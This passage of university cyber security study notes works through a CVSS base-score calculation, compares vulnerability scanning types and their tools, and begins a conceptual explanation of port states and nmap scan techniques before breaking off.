$$ \text{ISS} = 0.8064 $$

**Step 2: Calculate Impact**

$$ \text{Impact} = 6.42 \times \text{ISS} = 6.42 \times 0.8064 = 5.177 $$

**Step 3: Calculate Exploitability**

$$ \text{ES} = 8.22 \times 0.85 \times 0.77 \times 0.85 \times 0.85 $$

$$ \text{ES} = 8.22 \times 0.85 = 6.987 $$
$$ \text{ES} = 6.987 \times 0.77 = 5.380 $$
$$ \text{ES} = 5.380 \times 0.85 = 4.573 $$
$$ \text{ES} = 4.573 \times 0.85 = 3.887 $$

**Step 4: Compute Base Score**

For Scope = Unchanged:

$$ \text{BaseScore} = \text{round}(\text{minimum}((\text{Impact} + \text{ES}), 10)) $$

$$ \text{BaseScore} = \text{round}(\text{minimum}((5.177 + 3.887), 10)) $$

$$ \text{BaseScore} = \text{round}(\text{minimum}(9.064, 10)) = \text{round}(9.064) $$

$$ \boxed{\text{BaseScore} = 9.1 \text{ (Critical Severity)}} $$

#### **(b) [7 Marks] Compare Network-Based, Host-Based, and Web Application Vulnerability Scanning. Provide suitable tools for each.**

**Model Solution:**

| Parameter | Network-Based Scan | Host-Based Scan | Web Application Scan |
|-----------|--------------------|------------------|----------------------|
| **Scope** | Entire network, perimeter devices, open ports, exposed services | Single endpoint (server, workstation, laptop) | Web apps, REST APIs, GraphQL |
| **Layer** | Layer 2–4 (TCP/IP) | Layer 7 + OS Internals (Registry, Patches, Services) | Layer 7 (HTTP/HTTPS, Cookies, Sessions) |
| **Perspective** | External attacker | Local administrator | Unauthenticated remote user |
| **Credentials** | Not required | Required (read-only) | Not required (treated as anonymous) |
| **Detects** | Open ports, unpatched services, rogue devices, weak protocols | Missing OS patches, insecure file permissions, weak passwords, malware | SQL Injection (SQLi), Cross-Site Scripting (XSS), CSRF, broken authentication, IDOR |
| **Tools** | **Nmap** (with NSE scripts), **OpenVAS**, **Nessus** | **Nessus (credentialed)**, **Lynis**, **Microsoft Defender ATP** | **OWASP ZAP**, **Burp Suite**, **Nikto**, **SQLMap** |
| **Risk of Disruption** | Low to Medium | Very Low | Medium to High (may send malicious payloads) |
| **Compliance Use** | PCI-DSS External Scan, perimeter audits | CIS Benchmarks, DISA STIGs | OWASP Top 10, GDPR Art. 32 |

**Conclusion:**
A mature security program uses **all three types** in a defense-in-depth strategy: **Network scans** to secure the perimeter, **Host scans** to secure the endpoints, and **Web Application scans** to secure the customer-facing interface. Modern tools like **Tenable.io**, **Qualys VMDR**, and **Rapid7 InsightVM** integrate all three into a single unified platform.

---

## 📌 TOPIC RECAP & IMPORTANT THINGS TO REMEMBER

- **Definition:** Vulnerability scanning is the *automated identification* of known security weaknesses using a database like **CVE/NVD**. It is **non-destructive** (does not exploit).
- **CVSS v3.1 Score Range:** **0.0 (None) to 10.0 (Critical)**. Severity bands are **Low (0.0–3.9), Medium (4.0–6.9), High (7.0–8.9), Critical (9.0–10.0)**.
- **Authenticated vs. Unauthenticated:** Authenticated scans provide *internal/depth* visibility; unauthenticated scans provide *external/attacker* visibility.
- **Lifecycle:** Plan → Scan → Analyze → Prioritize → Remediate → Re-Scan → Report. **Continuous** scanning is essential due to new CVEs published daily.
- **CVSS Base Score Formula (Scope = Unchanged):** $\text{BaseScore} = \text{round}(\text{min}(\text{Impact} + \text{Exploitability}, 10))$.
- **Impact Formula:** $\text{Impact} = 6.42 \times (1 - (1-C)(1-I)(1-A))$.
- **Exploitability Formula:** $8.22 \times \text{AV} \times \text{AC} \times \text{PR} \times \text{UI}$.
- **Key Distinction:** Vulnerability Scan = *Identify*. Penetration Test = *Exploit*. Both are complementary, not substitutes.
- **Mandatory Standards:** **PCI-DSS 11.3** (quarterly scans), **NIST 800-40** (patch management), **ISO 27001** (asset inventory).
- **Top Tools to Remember:** **Nessus** (commercial gold standard), **OpenVAS** (open source), **Nmap** (network mapping), **OWASP ZAP** (web apps), **Qualys** (cloud-based).
- **Common Exam Pitfall:** Students confuse **False Positive** (scanner wrongly reports an issue) with **False Negative** (scanner misses a real issue). FNR is more dangerous.
- **DevSecOps Integration:** Scanners like **Snyk**, **Trivy**, and **OWASP Dependency-Check** are integrated directly into **CI/CD pipelines** for shift-left security.
- **Compliance Vocabulary:** Always mention **CVE**, **NVD**, **CVSS**, **OWASP Top 10**, and **MITRE ATT&CK** in your answers to score higher in KTU evaluations.

<!-- SECTION_5_END -->

topics.title: Open Port/Service Identification
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PEEOT741 - FUNDAMENTALS OF CYBER SECURITY
> - **Module:** Module 4
> - **Topic:** Open Port/Service Identification

<!-- SECTION_1_START -->

# Open Port/Service Identification

## 1.1 Core Technical Definition

> [!IMPORTANT]
> **Open Port/Service Identification** is the second phase of the *Information Gathering* / *Network Scanning* stage in the Cyber Kill Chain (post-footprinting). It involves sending specially crafted packets to a target host across the **0–65535 TCP/UDP port range** to determine which ports are in `OPEN`, `CLOSED`, or `FILTERED` states, and to enumerate the specific application-layer services, protocol versions, and banners running on those ports.

In KTU 2024 Scheme terminology, this maps directly to the **Scanning Phase** of ethical hacking, preceding *Vulnerability Analysis* and *Exploitation*. It answers three fundamental reconnaissance questions:

1. **Which ports are open?** (Port Scanning)
2. **Which services are listening on those ports?** (Service/Version Detection)
3. **What is the underlying Operating System?** (OS Fingerprinting — often a co-output of the same tool)

The standard port range is divided into three logical categories defined by the **Internet Assigned Numbers Authority (IANA)**:

| Port Range | Category | Allocation | Registration Process |
|---|---|---|---|
| **0 – 1023** | **Well-Known Ports** | System / Root processes (HTTP, SSH, DNS) | IANA strict assignment |
| **1024 – 49151** | **Registered Ports** | Vendor / Application processes (MySQL, RDP) | IANA registration |
| **49152 – 65535** | **Dynamic / Private Ports** | Ephemeral client connections | No registration |

> [!NOTE]
> The IANA / RFC 6335 specification governs the *intent* of a port (0–1023 reserved for privileged services), but **no operating system enforces the protocol-to-port mapping**. A web server can run on port 22, and an SSH daemon on port 80 — this is a common attacker deception tactic called *service masquerading*.

## 1.2 Intuitive Analogy

Imagine a large **apartment building (the target host)** with **65,536 doors (ports)**. Before a locksmith (an attacker) tries to break in:

- **Port Scanning** is like walking around the building jiggling every door handle. The doors that *swing open* are the **OPEN ports** — the flats where someone is home.
- **Service Identification** is like peeking through the open door and asking, *"Excuse me, who lives here?"* The resident may honestly answer (e.g., "I'm an Apache Web Server, version 2.4.41") — this is the **banner**.
- **Service Masquerading** is when the resident lies, "I'm Bob the Plumber," when in fact the apartment is a research lab. Tools like `nmap` use *probe-response heuristics* (not just banners) to detect such deception.
- **A "Filtered" port** is a door behind a **locked gate with a security guard** (firewall) who refuses to even let you see the door. You get no answer at all.

> [!TIP]
> **Real-world exam cue:** If a question mentions *no response from the target* → state is **FILTERED** (firewall dropping packets). *RST/ACK* response → state is **CLOSED**. *SYN-ACK* response → state is **OPEN**.

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->

# 2. Deep Theoretical Analysis

## 2.1 The TCP Three-Way Handshake as a Scanning Primitive

Open Port/Service Identification exploits the deterministic state machine of the **TCP three-way handshake (RFC 793)**:

$$ \text{Client} \xrightarrow{\text{SYN}} \text{Server} \xrightarrow{\text{SYN-ACK}} \text{Client} \xrightarrow{\text{ACK}} \text{Server} $$

Every TCP scan technique is essentially a *controlled manipulation* of this handshake. By observing how the target's TCP stack responds to abnormal packet sequences, the scanner infers the port's state. This is a beautiful application of *active reconnaissance* — the attacker generates traffic and interprets the passive response.

## 2.2 Taxonomy of Port Scanning Techniques

The KTU 2024 syllabus (Module 4 — Hacking Phases & Scanning) emphasizes the following techniques, ranked by stealthiness and information yield:

### 2.2.1 TCP Connect Scan (`-sT`)
- **Mechanism**: Completes the full three-way handshake via the OS's `connect()` syscall.
- **Why it works**: A successful connection means the port is `OPEN`; an immediate `RST` means `CLOSED`.
- **Trade-off**: Highest visibility — the connection appears in application logs and is trivially detected by any **IDS (Intrusion Detection System)**.

### 2.2.2 SYN Scan / Half-Open Scan (`-sS`)
- **Mechanism**: Sends `SYN`, receives `SYN-ACK`, then immediately sends `RST` to abort the handshake.
- **Why it works**: The half-open state is *almost* logged by the target's kernel but is not committed to the application-layer connection table.
- **Trade-off**: Requires raw socket privileges (root). Considered the **default standard** for ethical hackers — fast, accurate, and stealthy.

### 2.2.3 FIN Scan (`-sF`), NULL Scan (`-sN`), XMAS Scan (`-sX`)
